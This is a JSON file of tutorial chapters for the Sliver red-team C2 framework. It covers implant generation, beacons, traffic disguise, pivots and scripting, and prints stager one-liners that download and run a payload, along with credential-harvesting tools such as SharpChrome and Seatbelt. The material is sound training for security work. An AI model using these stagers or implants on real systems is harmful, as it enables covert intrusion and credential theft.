{"tutorials":[{"name":"1 - Getting Started","content":"# This course is intended for the 1.6 version of Sliver, which is not yet published\n\n`sliver-server` is the binary you want to use to run the Sliver C2 server, `sliver-client` is solely a client to connect to a Sliver C2 server. Sliver server also acts as a client on its own, so you don’t necessarily run sliver server and client separately.\n\nFirst time running Sliver will take a couple seconds as it's retrieving its dependencies. Consecutive executions will be much faster. Go ahead and launch the `sliver-server`.\n\n```asciinema\n{\"src\": \"/asciinema/startup.cast\", \"cols\": \"132\", \"rows\": \"28\", \"idleTimeLimit\": 8}\n```\n\nLet's take a couple minutes to discuss what Sliver actually is and how it's set up.\n\n![Alt text](/images/Architecture.png)\n\nNow that Sliver is running, lets generate and execute your first implant to try out some of the basic features of Sliver, for now we’re going to run everything on the local host.\n\nHere's what we're going to do: \n* Generate your implant using the `generate` command as shown below.\n* Start HTTP listener on port 80\n* Execute implant in a separate terminal\n\n```asciinema\n{\"src\": \"/asciinema/first-implant.cast\", \"cols\": \"132\", \"rows\": \"14\", \"idleTimeLimit\": 8}\n```\n\nNow let’s select our implant and run our first command using the `use` command.\n\n```bash\n[server] sliver > use\n? Select a session or beacon: \nSESSION  1884a365  RELATED_EARDRUM  [::1]:49153      test.local  tester  darwin/amd64\n[*] Active session RELATED_EARDRUM (1884a365-085f-4506-b28e-80c481730fd0)\n\n[server] sliver (RELATED_EARDRUM) > pwd\n\n[*] /Users/tester/tools\n```\n\nOnce you have reached this point, go ahead and explore some of the commands listed below. In each case, first check out the command's help using the **`-h`** flag then try it out!\n\n```bash\nExploring and interacting with the filesystem\n\nFilesystem\n  cat               Dump file to stdout\n  cd                Change directory\n  cp                Copy a file\n  download          Download a file\n  grep              Search for strings that match a regex within a file or directory\n  head              Grab the first number of bytes or lines from a file\n  ls                List current directory\n  mkdir             Make a directory\n  mv                Move or rename a file\n  pwd               Print working directory\n  rm                Remove a file or directory\n  tail              Grab the last number of bytes or lines from a file\n  upload            Upload a file\n```\n\n```asciinema\n{\"src\": \"/asciinema/filesystem.cast\", \"cols\": \"132\", \"rows\": \"14\", \"idleTimeLimit\": 8}\n```\n\nGetting some environmental information\n```bash\nInfo\n  env               List environment variables\n  getgid            Get session process GID\n  getpid            Get session pid\n  getuid            Get session process UID\n  info              Get session info\n  ping              Send round trip message to implant (does not use ICMP)\n  whoami            Get session user execution context\n```\nExecute a binary\n\n```asciinema\n{\"src\": \"/asciinema/execute.cast\", \"cols\": \"132\", \"rows\": \"14\", \"idleTimeLimit\": 8}\n```\n\nRunning an interactive shell\n\n```asciinema\n{\"src\": \"/asciinema/shell.cast\", \"cols\": \"132\", \"rows\": \"14\", \"idleTimeLimit\": 8}\n```\n\nNot all commands are supported for all operating systems or meant to be used on all operating systems, here are a few examples:\n\n```\nmount             Get information on mounted filesystems (only for Windows and Linux)\nscreenshot        Take a screenshot (only for Windows and Linux)\nmemfiles          List current memfiles (Linux only)\n```\n\nThis is an open-source project if you see a bug please file an issue! Pull requests are always welcome."},{"name":"2 - Beacons vs Sessions","content":"# This course is intended for the 1.6 version of Sliver, which is not yet published\n\nSliver implants support two types of connections, sessions and beacons.\n\nSessions use long-polling connections, which means they constantly maintain a single TCP connection open while communicating with the server. Beacons on the other hand call back periodically and will sleep when not active which can help keep their presence hidden. You could limit callbacks to once every 6 hours for example and only 'activate' the beacon when needed by switching its sleeping time to a shorter duration.\n\nTypically during an engagement you will want to deploy a beacon on the target system and switch to a session while doing more active enumeration.\n\nLet’s start with generating and deploying a beacon using `http`.\n\n```asciinema\n{\"src\": \"/asciinema/beacon_generation.cast\", \"cols\": \"132\", \"rows\": \"14\", \"idleTimeLimit\": 8}\n```\n\nYou can see the beacon callback times either in the `info` command or using `beacons watch`.\n\n```bash\n[server] sliver > beacons watch\n\n ID         Name            Transport   Username          Operating System   Last Check-In   Next Check-In\n========== =============== =========== ================= ================== =============== ===============\n 942c647c   TIRED_GIRAFFE   http(s)     tester   darwin/amd64       52s             12s\n\n```\n\nBeacon callback times and jitter can be set either during generation or on the fly using the `reconfig` command.\n\nThe example below sets the callback time to 5s with a 1s jitter.\n\n```bash\n[server] sliver (TIRED_GIRAFFE) > reconfig -i 5s -j 1s\n\n[*] Tasked beacon TIRED_GIRAFFE (b8aa6fd8)\n\n[+] TIRED_GIRAFFE completed task b8aa6fd8\n\n[*] Reconfigured beacon\n\n[server] sliver (TIRED_GIRAFFE) > info\n\n         Beacon ID: 942c647c-8409-4877-9fa2-b84a7f27ad45\n              Name: TIRED_GIRAFFE\n          Hostname: tester.local\n              UUID: c6de1a44-016a-5fbe-b76a-da56af41316d\n          Username: tester\n               UID: 501\n               GID: 20\n               PID: 55879\n                OS: darwin\n           Version:\n            Locale:\n              Arch: amd64\n         Active C2: https://127.0.0.1\n    Remote Address: 127.0.0.1:51803\n         Proxy URL:\n          Interval: 1m0s\n            Jitter: 30s\n     First Contact: Wed Apr 19 01:14:21 CEST 2023 (10m30s ago)\n      Last Checkin: Wed Apr 19 01:18:20 CEST 2023 (6m31s ago)\n      Next Checkin: Wed Apr 19 01:19:46 CEST 2023 (5m5s ago)\n```\n\nCommands issued for beacons can be viewed using `tasks`, the task state will indicate whether the command has completed or not.  The results of previously run tasks can be viewed using `tasks fetch`.\n\n```asciinema\n{\"src\": \"/asciinema/beacon_tasks.cast\", \"cols\": \"132\", \"rows\": \"14\", \"idleTimeLimit\": 8}\n```\n\nSession can be spun up in our beacon process using the `interactive` command. Under the hood this will spawn a goroutine running session connection loop in the same beacon process.\n\n```asciinema\n{\"src\": \"/asciinema/beacon_interractive.cast\", \"cols\": \"132\", \"rows\": \"14\", \"idleTimeLimit\": 8}\n```\n\nBecause of the differences between sessions and beacons, certain commands like `upload` or `download` are slower on beacons due to the callback time. Others such as socks5 are only supported for sessions. As a rule of thumb anything requiring higher network bandwidth should be run from a session.\n\nLet’s switch to our newly created session and spin-up a `socks5` proxy.\n\n```bash\n\n[server] sliver (TIRED_GIRAFFE) > use\n\n? Select a session or beacon: SESSION  131a60b9  TIRED_GIRAFFE  127.0.0.1:51969  tester.local  tester  darwin/amd64\n[*] Active session TIRED_GIRAFFE (131a60b9-db4f-4913-9064-18a17a0f09ab)\n\n[server] sliver (TIRED_GIRAFFE) > socks5 start\n\n[*] Started SOCKS5 127.0.0.1 1081\n⚠️  In-band SOCKS proxies can be a little unstable depending on protocol\n```\n\nYou can then point your browser to port 1081 to tunnel traffic through the implant to your target’s local network.\n\nTry out some of the previous commands and compare behaviour on beacons and sessions. Once you are done, you should remember to close your session thread using the `close` command.\n"},{"name":"3 - C2 Profiles and configuration","content":"# This course is intended for the 1.6 version of Sliver, which is not yet published\n\nWhen generating implants Sliver uses a C2Profile configuration to define how implant callbacks will look over HTTP/s. This allowed operators to control headers, cookies proxies, URL paths and so on. When the implant is generated the sliver server will then select portions of that configuration to generate the implant C2Profile.\n\nFor example if configured to use `/admin` and `/demo` as callback urls, it might use one, the other or both depending on your configuration allowing two implants using the same configuration to still seem slightly different from a network traffic perspective.\n\nC2 profile configurations can be seen using the `c2profile` command, which also has import and export features.\n\nThe full list of possible configuration option can be found in the references section below, but for now lets instead customise the existing configuration.\n\nLets imagine we’re trying to breach a customer and want to look like we're talking to Wordpress.\nWe would want to update the session messages and staging with something more realistic and replace all references to `woff` for example with something less suspicious like `css`, `js` or `php`.\n\nWe would also use a list of common Urls and filenames for Wordpress like `https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/URLs/urls-wordpress-3.3.1.txt` for the `files` and `paths` variables. You could alternatively reuse Urls discovered while enumerating your target's external perimeter in a similar way.\n\nYou can use `c2profiles generate -f urls-wordpress-3.3.1.txt -n wordpress -i` to generate a new c2 profile using the urls we just downloaded. By default this command will use the default c2 profile as a template for all other variables, if you want to edit any of those you can export and re-import the modified profile. \n\nAt this point we can generate a new implant using our new profile.\n\n```asciinema\n{\"src\": \"/asciinema/implant_custom_c2profile.cast\", \"cols\": \"132\", \"rows\": \"14\", \"idleTimeLimit\": 8}\n```\n\nIf we review the debug logs of our implant we can see that the connections now use our new profile.\n\n```asciinema\n{\"src\": \"/asciinema/implant_debug_logs.cast\", \"cols\": \"132\", \"rows\": \"28\", \"idleTimeLimit\": 8}\n```\n\nIdeally during engagements your recon phase should inform your C2 infrastructure, reusing similar hosting providers, technologies and communication protocols can help your implant fly under the radar. \n\n"},{"name":"4 - HTTP Payload staging","content":"# This course is intended for the 1.6 version of Sliver, which is not yet published\n\nWhen using Sliver during a live engagement, you’re going to need to use custom stagers, which are essentially a first binary or commandline that will retrieve and/or load Sliver into memory on your target system. Sliver can generate shellcode for your stager to execute by using the `profiles` command.\n\nFor this exercise, we will create a new beacon profile and prepare to stage it.\n\n```asciinema\n{\"src\": \"/asciinema/create_profile.cast\", \"cols\": \"132\", \"rows\": \"14\", \"idleTimeLimit\": 8}\n```\n\nIf you look at the generated implant, you'll notice the `ID` field has been populated. When downloading your payload from the staging server your URL needs to be in the form of:\n```\nhttps://sliver-ip/definitely/not/malware?x=yourID\n```\n\nThere is a lot of flexibility in the form of this URL, the conditions for successful staging are:\n* There has to be http url parameter containing the implant ID\n* The digits found in the ID need to match an implant ID, if your implant ID is 1234, abcd1234, 12beu34 are all valid values\n\nTo expose a payload, you need to use the `implants stage` command and specifically select the implant to leave accessible.\n\n```asciinema\n{\"src\": \"/asciinema/stage_implant.cast\", \"cols\": \"132\", \"rows\": \"14\", \"idleTimeLimit\": 8}\n```\n\nAt this point we can try retrieving our implant. The ID is 19778.\n\n```asciinema\n{\"src\": \"/asciinema/implant_curl.cast\", \"cols\": \"132\", \"rows\": \"14\", \"idleTimeLimit\": 8}\n```\n\nSliver staging also supports encoding or encrypting our payloads before exposing them externally using the `profile stage` command, the implant configuration remains the same but you are now able to stage different versions of it simultaneously.\n\n```asciinema\n{\"src\": \"/asciinema/stage_compress_encrypt.cast\", \"cols\": \"132\", \"rows\": \"14\", \"idleTimeLimit\": 8}\n```\n\nA simple stager could look like this, for example in Linux:\n\n```\ncurl http://localhost/nothingtoseehere.yml?c=1234 --output nothingtoseehere && chmod u+x nothingtoseehere &&nohup ./nothingtoseehere\n```\n\nOr on Windows:\n```\ncurl http://172.20.10.3/test.woff?a=29178 -o t.exe && .\\t.exe\n```\n"},{"name":"5 - Pivots","content":"# This course is intended for the 1.6 version of Sliver, which is not yet published\n\nPivots allow routing implant traffic through other implants. This can be useful in environments that don’t have any outbound access, but are reachable from other parts of the network that you have access to.\n\nSliver supports two types of pivots: TCP, which can be used on all operating systems, and named pipes, which are Windows-only.\n\nIn both cases the workflow is relatively similar, as a first step, select a session and set up a pivot listener.\n\n```bash\n[server] sliver (INNER_GO-KART) > pivots tcp\n\n[*] Started tcp pivot listener :9898 with id 1\n\n[server] sliver (INNER_GO-KART) > pivots\n\n ID   Protocol   Bind Address   Number Of Pivots\n==== ========== ============== ==================\n  1   TCP        :9898                         0\n```\n\nThe listening port and interface can be configured during creation.\n\nThe next step is to generate a payload that will connect to our listener.\n\n```bash\n[server] sliver (INNER_GO-KART) > generate --tcp-pivot 127.0.0.1 --os macos\n\n[*] Generating new darwin/amd64 implant binary\n[*] Symbol obfuscation is enabled\n[*] Build completed in 12s\n[*] Implant saved to /Users/tester/tools/VALUABLE_SICK\n```\n\nExecuting this payload will cause it to connect back through our original implant and then back to our C2 server.\n\n```asciinema\n{\"src\": \"/asciinema/tcppivot.cast\", \"cols\": \"132\", \"rows\": \"14\", \"idleTimeLimit\": 8}\n```\n\nAs mentionned before named pipe pivots use a similar process, first you need to create a listener:\n\n```bash\n[server] sliver (WARM_DRIVEWAY) > pivots named-pipe --bind foobar\n\n[*] Started named pipe pivot listener \\\\.\\pipe\\foobar with id 1\n\n```\n\nYou can then generate an implant connecting to it \n\n```bash\nsliver > generate --os windows --debug --skip-symbols --named-pipe ./pipe/foobar\n\n[*] Generating new windows/amd64 implant binary\n[*] Build completed in 1s\n[*] Implant saved to /Users/tester/code/sliver/PROPER_SING.exe\n```\n\n"},{"name":"6 - Scripting","content":"# This course is intended for the 1.6 version of Sliver, which is not yet published\n\nReactions are a basic way to automate tasks in the sliver console, they allow you to specify sliver commands to run on a list of events.\n\n```bash\nReactable Events:\n   session-connected  Triggered when a new session is opened to a target\n     session-updated  Triggered on changes to session metadata\nsession-disconnected  Triggered when a session is closed (for any reason)\n              canary  Triggered when a canary is burned or created\n          watchtower  Triggered when implants are discovered on threat intel platforms\n          loot-added  Triggered when a new piece of loot is added to the server\n        loot-removed  Triggered when a piece of loot is removed from the server\n```\n\nLet’s go ahead and create a reaction to list the current directory and environment variables when a new session checks in.\n\n```bash\nreaction set -e \"session-connected\"\n\n[*] Setting reaction to: Session Opened\n\n? Enter commands:  [Enter 2 empty lines to finish]pwd\nenv\n? Enter commands:\npwd\nenv\n\n[*] Set reaction to session-connected (id: 1)\n```\n\nThe reaction is now set, if you spin up a new session these commands will be automatically run on that session’s initial connection.\n\n```bash\n[*] Session 99c7a639 UNEXPECTED_PORTER - 127.0.0.1:59966 (test.local) - darwin/amd64 - Thu, 04 May 2023 09:04:58 CEST\n\n[*] Execute reaction: 'pwd'\n\n[*] /Users/tester\n\n[*] Execute reaction: 'env'\n\nPWD=/Users/tester\nCOLORTERM=truecolor\n...\n```\n\nYou can remove reactions using `reaction unset`.\n\nHowever, there are a couple of limitations to keep in mind when using reactions, first off, these are run in the console you are currently using, which is not necessarily the server console. So if you are connected to a sliver server using the sliver client, if you disconnect the client the reactions are no longer running. \n\nSecondly reactions are a relatively basic mechanism, you can’t use any conditional statements or more complex background tasks with them. For more complex use-cases you can instead write your own client in Python or Typescript for example to connect to the server over gRPC, which we’ll cover next.\n\n## Sliver-py\n\nFor the purposes of this tutorial we’ll write our extensions using Python3, however the same result is achievable using Typescript, Golang or any other language that can handle gRPC.\n\nFirst, install the sliver-py extension using pip.\n\n```bash\npip3 install sliver-py\n```\n\nSince our extension is essentially going to be another client connection to the sliver server, you’ll also need to enable multiplayer mode and generate a new profile\n\n```bash\n[server] sliver > multiplayer\n\n[*] Multiplayer mode enabled!\n\n[server] sliver > new-operator -n tester -l 127.0.0.1\n\n[*] Generating new client certificate, please wait ...\n[*] Saved new client config to: /Users/tester/tools/tester_127.0.0.1.cfg\n```\n\nWe now have everything we need to start writing our scripts, let’s run our first example interactively in a Python shell. \nWe first need to import a few dependencies, `SliverClientConfig`, which is used to parse the client config we’ve just created, and `SliverClient`, which will handle the connection to the backend server.\n\n```bash\nPython 3.9.16 (main, Dec  7 2022, 10:06:04)\nType 'copyright', 'credits' or 'license' for more information\nIPython 8.0.1 -- An enhanced Interactive Python. Type '?' for help.\n\nIn [1]: from sliver import SliverClientConfig, SliverClient\n\nIn [2]: DEFAULT_CONFIG = \"/Users/tester/tools/tester_127.0.0.1.cfg\"\n\nIn [3]: config = SliverClientConfig.parse_config_file(DEFAULT_CONFIG)\n\nIn [4]: client = SliverClient(config)\n\nIn [5]: await client.connect()\nOut[5]:\nMajor: 1\nMinor: 5\nPatch: 37\nCommit: \"0a43dc688ffb31a0a38511c47e8547a44a6918d4\"\nCompiledAt: 1681408237\nOS: \"darwin\"\nArch: \"arm64\"\n```\n\nFrom this point on we can use the client object to interact with the server, let’s start with listing any sessions or beacons that might be currently connected.\n\n```bash\nIn [6]: beacons = await client.beacons()\n\nIn [7]: sessions = await client.sessions()\n\nIn [8]: beacons\nOut[8]: []\n\nIn [9]: sessions\nOut[9]:\n[ID: \"f80ec897-0870-4f03-a1b1-364e5a0d243c\"\n Name: \"UNEXPECTED_PORTER\"\n Hostname: \"test.local\"\n UUID: \"c6de1a44-016a-5fbe-b76a-da56af41316d\"\n Username: \"tester\"\n UID: \"501\"\n GID: \"20\"\n OS: \"darwin\"\n Arch: \"amd64\"\n Transport: \"http(s)\"\n RemoteAddress: \"127.0.0.1:60218\"\n PID: 74773\n Filename: \"/Users/tester/tools/UNEXPECTED_PORTER\"\n LastCheckin: 1683185925\n ActiveC2: \"http://127.0.0.1\"\n ReconnectInterval: 60000000000\n PeerID: 4416183373589698218\n FirstContact: 1683185429]\n```\n\nTo run commands on this session you’ll need to create an InteractiveSession object.\n\n```bash\nIn [10]: interact = await client.interact_session(\"f80ec897-0870-4f03-a1b1-364e5a0d243c\")\n\nIn [11]: await interact.pwd()\nOut[11]: Path: \"/Users/tester\"\n```\n\nNow that we’ve got the basics of connecting to sliver and running commands down let’s write a more useful script that will display the hosts file when a new session checks in. Our goal is to first identify the Operating System, and then based on that retrieve and display the contents of the hosts file if it exists. Because this script will wait and react to events emitted by the Sliver server, we’re going to use `asyncio` to write our client.\n\n```bash\n#!/usr/bin/env python3\n\nimport os\nimport asyncio\nfrom sliver import SliverClientConfig, SliverClient\nimport gzip\n\nDEFAULT_CONFIG = \"/Users/tester/tools/neo_127.0.0.1.cfg\"\n\nasync def main():\n    ''' Client connect example '''\n    config = SliverClientConfig.parse_config_file(DEFAULT_CONFIG)\n    client = SliverClient(config)\n    await client.connect()\n\n    async for event in client.on('session-connected'):\n        print('Session %s just connected !' % event.Session.ID)\n\nif __name__ == '__main__':\n    loop = asyncio.get_event_loop()\n    loop.run_until_complete(main())\n```\n\nAs shown above we can access the session object through `event.Session`. Let’s go ahead and add a few conditions based on the operating system.\n\n```bash\nif event.Session.OS == \"darwin\":\n            print('Session is running on macOS')\n\nelif event.Session.OS == \"Linux\":\n            print('Session is running on Linux')\nelif event.Session.OS == \"Windows\"\n            print('Session is running on Windows')\nelse:\n            print('Session is running on %s', event.Session.OS)\n```\n\nLet’s set up an InteractiveSession object like previously.\n\n```bash\ninteract = await client.interact_session(event.Session.ID)\n```\n\nWe’re going to start with writing the code for Linux and macOS, since in their case the file is located in the same place. First we check if the file exists, then we download and decompress it to display its contents using gzip.\n\n```bash\nfile_listing = await interact.ls(\"/etc/hosts\")\nif file_listing.Exists:\n\tgzipFile = await interact.download(\"/etc/hosts\")\n  contents = gzip.decompress(gzipFile.Data)\n  print('%r' % contents)\n```\n\nThe code for Windows is relatively similar the only major difference being the file location.\n\n```bash\nfile_listing = await interact.ls(\"C:/Windows/System32/drivers/etc/hosts\")\nif file_listing.Exists:\n\tgzipFile = await interact.download(\"C:/Windows/System32/drivers/etc/hosts\")\n  contents = gzip.decompress(gzipFile.Data)\n  print('%r' % contents)\n```\n\nIf we run our script and spin up a few sessions we should start to see hosts files being retrieved.\n\n```bash\npython3.11 autocat.py\nAutomatically interacting with session 16338c85-b670-44ab-ac83-2df885654b07\nb\"# Copyright (c) 1993-2009 Microsoft Corp.\\r\\n#\\r\\n# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.\\r\\n#\\r\\n# ...\n\nAutomatically interacting with session 93fcbab2-f00d-44a4-944a-e1ea8ec324e2\nb'##\\n# Host Database\\n#\\n# localhost is used to configure the loopback interface\\n# when the system is booting.  Do not change this entry.\\n##\\n127.0.0.1...\n```\n"},{"name":"7 - Assemblies and Bofs","content":"# This course is intended for the 1.6 version of Sliver, which is not yet published\n\nThe Sliver armory is used to install and maintain third party extensions and aliases within sliver. The full list of available extensions can be found at https://github.com/sliverarmory/armory, keep in mind this is community maintained so not all modules are necessarily up to date. \n\nYou can download all configured extensions/aliases using the armory command.\n\n```bash\n[server] sliver > armory install all\n? Install 18 aliases and 84 extensions? Yes\n[*] Installing alias 'SharpSecDump' (v0.0.1) ... done!\n[*] Installing alias 'SharpChrome' (v0.0.1) ... done!\n[*] Installing alias 'SharpDPAPI' (v0.0.1) ... done!\n[*] Installing alias 'SharpMapExec' (v0.0.1) ... done!\n[*] Installing alias 'KrbRelayUp' (v0.0.1) ... done!\n[*] Installing alias 'SharpRDP' (v0.0.1) ... done!\n[*] Installing alias 'SharpUp' (v0.0.1) ... done!\n[*] Installing alias 'SharpView' (v0.0.1) ... done!\n[*] Installing alias 'SharPersist' (v0.0.1) ... done!\n[*] Installing alias 'Sharp WMI' (v0.0.2) ... done!\n...\n[*] All packages installed\n```\n\nThese commands can then be used in the context of a session or beacon similarly to other commands, with a couple caveats.\n\nLet’s go ahead and run our first assembly.\n\n```bash\n[server] sliver (UNABLE_PRIDE) > seatbelt \" WindowsCredentialFiles\"\n\n[*] seatbelt output:\n\n                        %&&@@@&&\n                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%\n                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%\n%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((\n#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((\n#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((\n#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((\n#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####\n###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####\n#####%######################  %%%..                       @////(((&%%%%%%%################\n                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*\n                        &%%&&&%%%%%        v1.1.1         ,(((&%%%%%%%%%%%%%%%%%,\n                         #%%%%##,\n\n====== WindowsCredentialFiles ======\n\n  Folder : C:\\Users\\defaultuser0\\AppData\\Local\\Microsoft\\Credentials\\\n\n   ...\n```\n\nAs you can see Sliver ran the Seatbelt assembly and provided us with the output of our command.\n\n## Bof’s\n\nBeacon object files are loaded using trustedsec’s coffloader. When you run a bof command the loader will first be loaded into memory and is used to run whichever bof you choose. From an operator’s perspective bof’s are similar to basic sliver commands.\n\n```bash\n[server] sliver (UNABLE_PRIDE) > sa-whoami\n\n[*] Successfully executed sa-whoami (coff-loader)\n[*] Got output:\n\nUserName\t\tSID\n====================== ====================================\ntest.local\\tester\n\nGROUP INFORMATION                                 Type                     SID                                          Attributes\n================================================= ===================== ============================================= ==================================================\ntest.local\\None                              Group                    S-1-5-21-3109228153-3872411817-1195593578-513 Mandatory group, Enabled by default, Enabled group,\nEveryone                                          Well-known group         S-1-1-0                                       Mandatory group, Enabled by default, Enabled group,\nNT AUTHORITY\\Local account and member of Administrators groupWell-known group         S-1-5-114\nBUILTIN\\Administrators                            Alias                    S-1-5-32-544\nBUILTIN\\Performance Log Users                     Alias                    S-1-5-32-559                                  Mandatory group, Enabled by default, Enabled group,\nBUILTIN\\Users                                     Alias                    S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group,\nNT AUTHORITY\\INTERACTIVE                          Well-known group         S-1-5-4                                       Mandatory group, Enabled by default, Enabled group,\nCONSOLE LOGON                                     Well-known group         S-1-2-1                                       Mandatory group, Enabled by default, Enabled group,\nNT AUTHORITY\\Authenticated Users                  Well-known group         S-1-5-11                                      Mandatory group, Enabled by default, Enabled group,\nNT AUTHORITY\\This Organization                    Well-known group         S-1-5-15                                      Mandatory group, Enabled by default, Enabled group,\nNT AUTHORITY\\Local account                        Well-known group         S-1-5-113                                     Mandatory group, Enabled by default, Enabled group,\nLOCAL                                             Well-known group         S-1-2-0                                       Mandatory group, Enabled by default, Enabled group,\nNT AUTHORITY\\NTLM Authentication                  Well-known group         S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group,\nMandatory Label\\Medium Mandatory Level            Label                    S-1-16-8192                                   Mandatory group, Enabled by default, Enabled group,\n\nPrivilege Name                Description                                       State\n============================= ================================================= ===========================\nSeShutdownPrivilege           Shut down the system                              Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking                          Enabled\nSeUndockPrivilege             Remove computer from docking station              Disabled\nSeIncreaseWorkingSetPrivilege Increase a process working set                    Disabled\nSeTimeZonePrivilege           Change the time zone                              Disabled\n```\n\nSince these payloads are run in-process, they have similar advantages and drawbacks as in-process assemblies, meaning no new processes are spawned on execution, but a crash risks losing the implant.\n"}]}